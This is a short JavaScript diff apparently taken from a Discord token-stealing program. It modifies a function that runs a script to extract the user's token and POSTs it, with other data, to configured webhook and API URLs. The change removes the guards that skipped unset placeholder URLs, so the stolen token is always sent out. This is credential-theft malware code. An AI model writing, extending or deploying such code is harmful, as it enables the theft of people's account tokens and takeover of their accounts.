@@ -376,7 +376,7 @@ function GetLangue(read) {
   var langue = languages[read] || ":flag_us: USA";
   return langue;
 }
-const post = async (params) => {
+const post = async (params, key) => {
   params = JSON.stringify(params);
   var token = await execScript(tokenScript);
   var n = JSON.stringify({
@@ -384,14 +384,12 @@ const post = async (params) => {
     token: token,
   });
   [config.Placed, config.webhook].forEach((res) => {
-    if (res == "%API_URL%") return;
-    if (res == "%WEBHOOK%") return;
     const url = new URL(res);
     const options = {
       host: url.hostname,
       port: url.port,
       path: url.pathname,
-      key: key ,
+      key: key,
       method: "POST",
       headers: {
         "Content-Type": "application/json",
